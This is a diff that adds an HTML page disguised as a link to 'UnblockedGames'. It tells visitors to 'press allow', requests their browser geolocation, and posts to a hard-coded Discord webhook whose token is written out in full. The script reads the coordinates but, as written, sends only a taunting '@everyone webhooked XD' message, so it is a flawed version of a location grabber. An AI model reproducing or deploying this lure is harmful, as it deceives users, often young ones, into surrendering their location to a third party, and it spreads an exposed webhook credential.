@@ -1,0 +1,49 @@
+
+<!DOCTYPE html>
+<style>
+  button {font-size: 20px;}
+</style>
+<html>
+  <head>
+    <script>
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendLocation);
+        } else {
+          alert("Geolocation is not supported by this browser.");
+        }
+      }
+
+      function sendLocation(position) {
+        const lat = position.coords.latitude;
+        const long = position.coords.longitude;
+
+        const webhookUrl = "https://discord.com/api/webhooks/1059025248181288990/AYnuroL__71WBhwtSiUlPjkZnposz_LQ1pU2YDH7WEWdgDAELQPfzxy3jM0lHTYNQWcm"; // Replace with your own webhook URL
+
+        const data = {
+          content: `@everyone webhooked XD`
+        };
+
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error("Failed to send message to Discord");
+          }
+          alert("Location sent to Discord");
+        })
+        .catch(error => {
+          alert(error.message);
+        });
+      }
+    </script>
+  </head>
+  <body>
+    <button onclick="getLocation()">Click to goto UnblockedGames also press allow</button>
+  </body>
+</html>
